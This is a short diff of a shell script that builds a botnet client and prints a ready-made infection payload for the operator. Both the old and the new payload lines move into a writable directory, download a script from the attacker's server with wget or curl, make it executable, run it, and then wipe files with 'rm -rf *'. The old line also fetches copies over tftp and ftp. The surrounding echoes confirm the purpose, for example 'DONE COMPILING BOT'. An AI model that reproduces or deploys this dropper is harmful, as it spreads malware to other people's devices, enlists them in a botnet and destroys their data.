@@ -121,7 +121,7 @@ EOF
 
 echo "DONE COMPILING BOT, BINS IN /var/www/html"
 echo "THIS COMPILER IS NOT RECOMMENDED"
-echo "Your payload (COPIED FROM CONDI, MAKE YOUR OWN IF NEEDED OR BASED ON EXPLOIT): cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://$IP/cat.sh; curl -O http://$IP/cat.sh; chmod 777 cat.sh; sh cat.sh; tftp $IP -c get cat.sh; chmod 777 cat.sh; sh cat.sh; tftp -r cat2.sh -g $IP; chmod 777 cat2.sh; sh cat2.sh; ftpget -v -u anonymous -p anonymous -P 21 $IP cat1.sh cat1.sh; sh cat1.sh; rm -rf cat.sh cat.sh cat2.sh cat1.sh; rm -rf *"
+echo "Your payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://$IP/cat.sh; curl -O http://$IP/cat.sh; chmod 777 cat.sh; sh cat.sh; sh cat1.sh; rm -rf *"
 echo "if your port aint default 80 its not my problem do it manually urself thats just too much work for me, if you dont know what this is and just got a fresh vps you can ignore this message"
 
 exit 0
